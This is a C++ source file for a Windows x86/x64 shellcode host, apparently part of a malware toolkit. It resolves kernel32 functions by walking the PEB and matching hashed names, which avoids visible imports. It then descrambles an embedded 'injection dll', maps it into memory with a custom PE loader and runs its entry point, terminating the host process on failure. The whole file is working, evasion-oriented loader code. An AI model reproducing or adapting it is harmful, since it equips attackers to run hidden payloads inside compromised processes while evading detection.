// shellcode.cpp 
// x32/x64 shellcode host. Result is exe with all optimization. Code is extracted by foreign tool.


// perform essential compiler settings
// remove stdlib 
#pragma comment(linker, "/NODEFAULTLIB:libcmt.lib") 
#pragma comment(linker, "/NODEFAULTLIB:MSVCRT.lib")
#pragma comment(linker, "/NODEFAULTLIB:MSVCRTD.lib")
#pragma comment(linker, "/NODEFAULTLIB:libcmtd.lib")


#include <windows.h>



#if defined(_M_X64)
	// x64 system libs
	#pragma comment (lib, "..\\lib\\amd64\\BufferOverflowU.lib")
	#pragma comment (lib, "..\\lib\\amd64\\ntdll.lib")
#elif defined(_M_IX86)
	// x32 system libs
	#pragma comment (lib, "..\\lib\\i386\\BufferOverflowU.lib")
	#pragma comment (lib, "..\\lib\\i386\\ntdll.lib")
#else
	#error Unknown target CPU, no system libs can be found
#endif


#include "..\inc\PELoader.h"
#include "..\inc\HashedStrings.h"



#include "shellcode.h"

// special debugging include
#ifdef _DEBUG
#include "dbgt.h"
#endif


// shellcode-style simple api loader of ALREADY LOADED modules
// used to resolve basic kernel32's apis
// NB: no forwards allowed
// if i64ModuleFunctionHash is null, returned is just HMODULE to loaded i64ModuleNameHash
HMODULE GetProcAddressWithHash(_In_ UINT64 i64ModuleNameHash, _In_ UINT64 i64ModuleFunctionHash )
{
 PPEB PebAddress;
 PMY_PEB_LDR_DATA pLdr;
 PMY_LDR_DATA_TABLE_ENTRY pDataTableEntry;
 PVOID pModuleBase;
 PIMAGE_NT_HEADERS pNTHeader;
 DWORD dwExportDirRVA;
 PIMAGE_EXPORT_DIRECTORY pExportDir;
 PLIST_ENTRY pNextModule;
 DWORD dwNumFunctions;
 USHORT usOrdinalTableIndex;
 PDWORD pdwFunctionNameBase;
 PCSTR pFunctionName;
// UNICODE_STRING DllName;	// ptr to structure containing dll name, currently - full with path
 LPWSTR wszDllName;
// DWORD dwModuleHash;
// DWORD dwFunctionHash;
// PCSTR pTempChar;
 DWORD i;
 WCHAR wDllNameBuff[128];
 BYTE bDllNameCounter;

#if defined(_WIN64)
 PebAddress = (PPEB) __readgsqword( 0x60 );
#elif defined(_M_ARM)
 // I can assure you that this is not a mistake. The C compiler improperly emits the proper opcodes
 // necessary to get the PEB.Ldr address
 PebAddress = (PPEB) ( (ULONG_PTR) _MoveFromCoprocessor(15, 0, 13, 0, 2) + 0);
 __emit( 0x00006B1B );
#else
 PebAddress = (PPEB) __readfsdword( 0x30 );
#endif

 pLdr = (PMY_PEB_LDR_DATA)( ((PMY_PEB)PebAddress)->LoaderData );
 pNextModule = pLdr->InLoadOrderModuleList.Flink;
 pDataTableEntry = (PMY_LDR_DATA_TABLE_ENTRY) pNextModule;

 while (pDataTableEntry->DllBase != NULL)
 {
  //dwModuleHash = 0;
  pModuleBase = pDataTableEntry->DllBase;
  //BaseDllName = pDataTableEntry->BaseDllName;	// possible problem for win8+
  pNTHeader = (PIMAGE_NT_HEADERS) ((ULONG_PTR) pModuleBase + ((PIMAGE_DOS_HEADER) pModuleBase)->e_lfanew);
  dwExportDirRVA = pNTHeader->OptionalHeader.DataDirectory[0].VirtualAddress;

  wszDllName = (LPWSTR)pDataTableEntry->BaseDllName.Buffer;

  // Get the next loaded module entry
  pDataTableEntry = (PMY_LDR_DATA_TABLE_ENTRY) pDataTableEntry->InLoadOrderLinks.Flink;

  // If the current module does not export any functions, move on to the next module.
  if (dwExportDirRVA == 0) { continue; }

  // copy name to internal buffer and lowercase it
  bDllNameCounter = 0;
  while ((bDllNameCounter < 127) && (*(WORD *)((SIZE_T)wszDllName + (bDllNameCounter * 2)) != 0x00)) {
	  wDllNameBuff[bDllNameCounter] = *(WORD *)((SIZE_T)wszDllName + (bDllNameCounter * 2));
	if ((wDllNameBuff[bDllNameCounter] >= 'A') && (wDllNameBuff[bDllNameCounter] <= 'Z')) { wDllNameBuff[bDllNameCounter] =(WCHAR)( (WORD)wDllNameBuff[bDllNameCounter] + 32 ); }
	bDllNameCounter++;
  }
	wDllNameBuff[bDllNameCounter] = 0x0;	// null terminator

  if ( HashStringW((LPCWSTR)wDllNameBuff) == i64ModuleNameHash) {

	  // module name found, check if caller asked us to seek for the function
	  if (!i64ModuleFunctionHash) { return (HMODULE)pModuleBase; }

	  // proceed with checking funcs for this module
	  pExportDir = (PIMAGE_EXPORT_DIRECTORY) ((ULONG_PTR) pModuleBase + dwExportDirRVA);

	  dwNumFunctions = pExportDir->NumberOfNames;
	  pdwFunctionNameBase = (PDWORD) ((PCHAR) pModuleBase + pExportDir->AddressOfNames);

	  for (i = 0; i < dwNumFunctions; i++)  {

		   //dwFunctionHash = 0;
		   pFunctionName = (PCSTR)( *pdwFunctionNameBase + (ULONG_PTR)pModuleBase );
		   pdwFunctionNameBase++;

		   // check this function's hash against supplied one
		   if ( HashStringA((LPCSTR)pFunctionName) == i64ModuleFunctionHash ) {
			usOrdinalTableIndex = *(PUSHORT)(((ULONG_PTR) pModuleBase + pExportDir->AddressOfNameOrdinals) + (2 * i));
			return (HMODULE) ((ULONG_PTR) pModuleBase + *(PDWORD)(((ULONG_PTR) pModuleBase + pExportDir->AddressOfFunctions) + (4 * usOrdinalTableIndex)));
		   } // found func hash

	  } // for enum all functions in this module

  } // if module name's hash found 

 } // while enum all the modules from PEB.Ldr

 // All modules have been exhausted and the function was not found.
 return NULL;
}


void *my_memset(void *dest, int c, size_t count)
{
	size_t i;
 
	for( i = 0; i < count; i++ ) { ((unsigned char*)dest)[i] = c;}

	return dest;
}


#define ROTR8(x,r) (x >> r) | (x << (8 - r));
VOID _shEasyDeScramble(LPVOID pData, SIZE_T lLen)
{
	BYTE *p = (BYTE *)pData;
	SIZE_T lCounter = lLen;

	while (lCounter) {


		*p = ROTR8(*p, 2);

		p++; lCounter--;

	}

}


// entrypoint function for the shellcode
// receives pContextIn - ptr to shellcode context param followed by this code
void __stdcall main(LPVOID pContextIn)
{
	SHELLCODE_CONTEXT *pContext;	// ptr ro params structure
	DLLEntryPoint DllEntry;	// entry point of loaded file

	//LPVOID pPos = pMappedAddr;	// pMappedAddr for scanning and adjusting

	// resulting mapped dll and it's size
	LPVOID pImage;
	SIZE_T lImageSize;

	LPVOID pEP;	// entrypoint to be called
	
	SHELLCODE_APIS pAPIs;	// some essential apis to be passed to different functions

	LPVOID pExecDll;	// abs ptr to attached dll to be mapped and executed

	// get current pos and scan down to find signature for data chunk with ShellcodeEntryParams
	//while (*(DWORD *)pPos != SHELLCODE_CONTEXT_SIGNATURE) { pPos = (LPVOID)((SIZE_T)pPos + 1); }

	// gotcha or failed before this
	pContext = (SHELLCODE_CONTEXT *)pContextIn;

	// prepare apis to be used by PELoader
	//my_memset(&pAPIs, 0, sizeof(SHELLCODE_APIS)); // NB: in x64 this leads to ntdll.memset
	pAPIs.p_VirtualAlloc = (LPVOID (__stdcall *)(LPVOID,SIZE_T,DWORD,DWORD))	GetProcAddressWithHash( HASHSTR("kernel32.dll", 0x5fb644a978cd76ea), HASHSTR("VirtualAlloc", 0x0feab35650360da7) );
	pAPIs.p_VirtualFree =  (BOOL (__stdcall *)(LPVOID,SIZE_T,DWORD))			GetProcAddressWithHash( HASHSTR("kernel32.dll", 0x5fb644a978cd76ea), HASHSTR("VirtualFree", 0x8d72fa9ef0b20482) );
	pAPIs.p_GetProcAddress = (FARPROC (__stdcall *)(HMODULE,LPCSTR))			GetProcAddressWithHash( HASHSTR("kernel32.dll", 0x5fb644a978cd76ea), HASHSTR("GetProcAddress", 0x7323b50f53fe15eb) );
	pAPIs.p_LoadLibraryA = (HMODULE (__stdcall *)(LPCSTR))						GetProcAddressWithHash( HASHSTR("kernel32.dll", 0x5fb644a978cd76ea), HASHSTR("LoadLibraryA", 0x99bfccca0c1bb4b0) );
	pAPIs.p_ExitProcess = (void (__stdcall *)(UINT))							GetProcAddressWithHash( HASHSTR("kernel32.dll", 0x5fb644a978cd76ea), HASHSTR("ExitProcess", 0x8176597a137cfc69) );
	pAPIs.p_Sleep = (void (__stdcall *)(DWORD))									GetProcAddressWithHash( HASHSTR("kernel32.dll", 0x5fb644a978cd76ea), HASHSTR("Sleep", 0x25c5c9b49a4ce8d4) );

	// dbg
//	pAPIs.p_OutputDebugStringA = (void (__stdcall *)(LPCSTR)) GetProcAddressWithHash( HASHSTR("kernel32.dll", 0x5fb644a978cd76ea), HASHSTR("OutputDebugStringA", 0xf6e5c12887150fe0) );

#ifdef _DEBUG
	// dbg - read x64 lib from disk for dbg
	pExecDll = &bin_dbgt;
#else
	// release - calc abs ptr according to passed context structure
	pExecDll = (LPVOID)((SIZE_T)pContext->prelExecDll + (SIZE_T)pContextIn);
#endif


	// descramble injection dll, if needed
	if (*(WORD *)pExecDll != 'ZM') { _shEasyDeScramble(pExecDll, pContext->dwExecDllLen); }

	// call pe loader on passed params
	if (PELoad(&pAPIs, pExecDll, &pImage, &lImageSize, &pEP)) {

		DllEntry = (DLLEntryPoint)pEP;
		// call installer's EP passing ptr to self context as last param
		DllEntry(NULL, DLL_PROCESS_ATTACH, pContext);

		// to avoid problems, hold execution right here
		if (pContext->bNoReturnFromShellcode){ pAPIs.p_Sleep(INFINITE); }

	} // try to load



	// in case of any problems, terminate host process
	if (pContext->bNoReturnFromShellcode){ pAPIs.p_ExitProcess(255); }
	
}






